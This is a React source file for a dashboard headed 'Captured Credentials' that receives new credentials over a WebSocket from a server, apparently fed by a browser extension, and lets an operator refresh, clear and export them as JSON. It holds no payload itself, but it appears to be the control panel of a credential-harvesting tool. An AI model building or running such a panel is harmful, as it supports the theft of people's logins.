
import { useEffect, useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { RefreshCw, Trash2, Download, Copy } from "lucide-react";
import { CredentialsList } from "@/components/CredentialsList";
import { useWebSocket } from "@/hooks/useWebSocket";
import { useToast } from "@/hooks/use-toast";
import { Credential } from "@/lib/types";

// For demo purposes only
import { mockCredentials } from "@/lib/mockData";

const Dashboard = () => {
  const [isConnected, setIsConnected] = useState(false);
  const [credentials, setCredentials] = useState<Credential[]>(mockCredentials);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const { toast } = useToast();

  // In a real extension, this would connect to your actual server
  const serverUrl = "ws://localhost:3000";
  
  // Initialize WebSocket connection
  const { sendMessage, lastMessage, connectionStatus } = useWebSocket(serverUrl);

  useEffect(() => {
    setIsConnected(connectionStatus === 'connected');
    
    if (connectionStatus === 'connected') {
      toast({
        title: "Connected to server",
        description: "Successfully established connection with the server.",
        duration: 3000,
      });
    } else if (connectionStatus === 'disconnected') {
      toast({
        title: "Disconnected from server",
        description: "Connection to server lost. Trying to reconnect...",
        variant: "destructive",
        duration: 3000,
      });
    }
  }, [connectionStatus, toast]);

  useEffect(() => {
    // Handle incoming messages from the server
    if (lastMessage) {
      try {
        const data = JSON.parse(lastMessage.data);
        if (data.type === 'credentials') {
          setCredentials(prev => [...prev, ...data.credentials]);
          setIsRefreshing(false);
        } else if (data.type === 'NEW_CREDENTIAL') {
          setCredentials(prev => [...prev, data.credential]);
        }
      } catch (error) {
        console.error("Failed to parse WebSocket message:", error);
        setIsRefreshing(false);
      }
    }
  }, [lastMessage]);

  const clearCredentials = () => {
    setCredentials([]);
    sendMessage({ type: 'CLEAR_CREDENTIALS' });
    toast({
      title: "Credentials cleared",
      description: "All stored credentials have been cleared.",
      duration: 3000,
    });
  };

  const refreshCredentials = () => {
    setIsRefreshing(true);
    sendMessage({ type: 'GET_CREDENTIALS' });
    
    // Add a timeout to turn off the refreshing state if no response comes back
    setTimeout(() => {
      setIsRefreshing(false);
    }, 5000);
    
    toast({
      title: "Refreshing credentials",
      description: "Requesting latest credential data...",
      duration: 2000,
    });
  };

  const downloadCredentials = () => {
    const dataStr = JSON.stringify(credentials, null, 2);
    const dataUri = `data:application/json;charset=utf-8,${encodeURIComponent(dataStr)}`;
    
    const exportFileDefaultName = `credentials_${new Date().toISOString().slice(0,10)}.json`;
    
    const linkElement = document.createElement('a');
    linkElement.setAttribute('href', dataUri);
    linkElement.setAttribute('download', exportFileDefaultName);
    linkElement.click();
    
    toast({
      title: "Credentials downloaded",
      description: "Credentials have been exported as JSON.",
      duration: 3000,
    });
  };

  return (
    <div className="p-6">
      <Card className="w-full">
        <CardHeader className="flex flex-row items-center justify-between pb-2">
          <CardTitle className="text-xl">Captured Credentials</CardTitle>
          <div className="flex gap-2">
            <Button 
              variant="outline" 
              size="sm" 
              onClick={refreshCredentials}
              className="h-8"
              disabled={isRefreshing}
            >
              <RefreshCw className={`h-4 w-4 mr-1 ${isRefreshing ? 'animate-spin' : ''}`} />
              Refresh
            </Button>
            <Button 
              variant="outline" 
              size="sm" 
              onClick={downloadCredentials}
              className="h-8"
            >
              <Download className="h-4 w-4 mr-1" />
              Export
            </Button>
            <Button 
              variant="outline" 
              size="sm" 
              onClick={clearCredentials}
              className="h-8"
            >
              <Trash2 className="h-4 w-4 mr-1" />
              Clear
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <div className="mb-4 flex items-center">
            <Badge variant={isConnected ? "outline" : "destructive"} className="mr-2">
              {isConnected ? "Connected" : "Disconnected"}
            </Badge>
            <span className="text-sm text-muted-foreground">
              {credentials.length} credential{credentials.length !== 1 ? 's' : ''} captured
            </span>
          </div>
          <CredentialsList 
            credentials={credentials}
            onRefresh={refreshCredentials}
          />
        </CardContent>
      </Card>
    </div>
  );
};

export default Dashboard;
